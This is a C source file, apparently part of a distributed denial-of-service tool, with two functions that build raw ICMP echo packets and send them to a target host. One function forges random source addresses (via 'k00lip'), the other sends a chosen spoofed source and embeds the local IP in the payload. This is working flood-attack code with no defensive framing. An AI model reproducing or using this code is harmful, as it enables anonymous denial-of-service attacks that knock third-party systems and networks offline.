#include "tubby.h"


void icmp2(int lamer, int source)
{
  int sawcket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  struct sockaddr_in pothead;
  struct ip *ipi;
  struct icmp *icmpi;
  char *packet;
  char *crap;
  int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;
  struct in_addr amanda;

  pothead.sin_port = htons (0);
  pothead.sin_family = AF_INET;
  pothead.sin_addr.s_addr = lamer;

  srandom ((time (NULL) + random ()));
  packet = malloc (pktsize);
  ipi = (struct ip *) packet;
  icmpi = (struct icmp *) (packet + sizeof (struct ip));
  memset (packet, 0, pktsize);

  crap=packet+sizeof(struct icmp) + sizeof(struct ip);
  amanda.s_addr=returnlocalip();
  strcpy(crap,inet_ntoa(amanda)); 
  
  ipi->ip_v = 4;
  ipi->ip_tos = 7;
  ipi->ip_len = htons (pktsize);
  ipi->ip_id = htons (getpid ());
  ipi->ip_off = 0;
  ipi->ip_ttl = 0xff;
  ipi->ip_p = IPPROTO_ICMP;
  ipi->ip_hl=sizeof *ipi >> 2;
  ipi->ip_src.s_addr = source;
  ipi->ip_dst.s_addr = lamer;
  ipi->ip_sum = 0;

  icmpi->icmp_type = ICMP_ECHO;
  icmpi->icmp_code = 0;
  icmpi->icmp_cksum = htons (~(ICMP_ECHO << 8));
//  icmpi->icmp_cksum = ip_sum ((u_short *) icmpi, pktsize);

  sendto (sawcket, packet, pktsize, 0, (struct sockaddr *) &pothead, sizeof (struct sockaddr));
  close (sawcket);
  free (packet);
  return;
}


void
icmp (int lamer)
{

  struct sockaddr_in pothead;
  struct ip *ipi;
  struct icmp *icmpi;
  char *packet;
  int pktsize = sizeof (struct ip) + sizeof (struct icmp) + icmpsize; 

  pothead.sin_port = htons (0);
  pothead.sin_family = AF_INET;
  pothead.sin_addr.s_addr = lamer;

  srandom ((time (NULL) + random ()));
  packet = malloc (pktsize);
  ipi = (struct ip *) packet;
  icmpi = (struct icmp *) (packet + sizeof (struct ip));
  memset (packet, 0, pktsize);
  ipi->ip_v = 4;
 
  ipi->ip_tos = 0;
  ipi->ip_len = htons (pktsize);
  ipi->ip_id = htons (getpid ());
  ipi->ip_off = 0;
  ipi->ip_ttl = 0xff;
  ipi->ip_p = IPPROTO_ICMP;
  ipi->ip_hl=sizeof *ipi >> 2;

  ipi->ip_src.s_addr = k00lip ();

  ipi->ip_dst.s_addr = lamer;
  ipi->ip_sum = ip_sum ((u_short *) ipi, pktsize);

  icmpi->icmp_type = ICMP_ECHO;
  icmpi->icmp_code = 0;
  icmpi->icmp_cksum = htons (~(ICMP_ECHO << 8));

  sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &pothead,sizeof (struct sockaddr));
  free (packet);
  return;
}
